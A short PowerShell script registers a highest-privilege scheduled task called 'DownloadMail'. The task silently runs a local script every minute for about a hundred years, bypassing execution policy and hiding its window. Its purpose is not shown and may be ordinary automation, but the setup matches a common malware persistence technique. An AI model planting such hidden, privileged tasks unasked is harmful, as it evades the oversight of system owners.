$Action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument '-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "C:\Windows\gain\DownloadMail.ps1"'

$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date)
$Trigger.Repetition.Interval = "PT1M"
$Trigger.Repetition.Duration = "P36500D"

Register-ScheduledTask `
    -TaskName "DownloadMail" `
    -Action $Action `
    -Trigger $Trigger `
    -RunLevel Highest
